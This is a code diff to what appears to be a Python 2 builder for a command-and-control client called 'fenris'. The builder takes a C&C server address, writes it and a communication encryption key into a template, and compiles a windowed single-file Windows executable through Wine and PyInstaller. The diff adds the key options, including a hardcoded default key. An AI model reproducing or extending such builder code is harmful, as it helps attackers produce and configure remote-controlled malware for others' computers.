@@ -24,6 +24,7 @@ import os
 from tools.tools import tools
 import sys
 import signal
+from random import randint
 
 
 myTool = tools()
@@ -51,12 +52,25 @@ else:
 
 	if "-cf" in sys.argv or "--create-fenris" in sys.argv:
 		candc = raw_input("# C&C-server: ")
+		randKeyOrNpt = raw_input("# Generate a random communication encryption key? (yes(y), no(n), standard(s)): ")
+		key = ""
+		if randKeyOrNpt == "y":
+			key = str(randint(100000000, 999999999))
+		if randKeyOrNpt == "n":
+			key = raw_input("# Type in a passphrase: ")
+		if randKeyOrNpt == "s":
+			key = "gT8jUdw65h"
+		if randKeyOrNpt != "y" and randKeyOrNpt != "n" and randKeyOrNpt != "s":
+			print myTool.fail + "[-]" + myTool.stop + "Wrong input! (choose one of: y, n, s)"
+			sys.exit(0)
 		# update fenris.py
 		f = open("fenrisTemplate.py", "r")
 		newFileContent = ""
 		for line in f.readlines():
 			if "[DUMMYCANDC]" in line:
 				line = "candc = \"" + candc + "\"\n"
+			if "[DUMMYKEY]" in line:
+				line = "key = \"" + key + "\"\n"
 			newFileContent += line
 		f.close()
 		f = open("fenris.py", "w")
@@ -67,7 +81,9 @@ else:
 		pyinstaller = raw_input("# pyinstaller.py root-path: ")
 		os.system(". " + virtualEnvWine + "/bin/activate; wine c:/Python27/python.exe " + pyinstaller + " -w -a -F fenris.py")
 		print myTool.green + "[+]" + myTool.stop + " fenris.exe saved into dist/ folder."
+		print myTool.green + "[+]" + myTool.stop + " The encryption key for fenris.exe is: " + key
 		sys.exit()
+				
 	if "-s" in sys.argv or "--setup" in sys.argv:
 		setupParameter = ""
 		while(setupParameter != "p" and setupParameter != "e" and setupParameter != "c"):
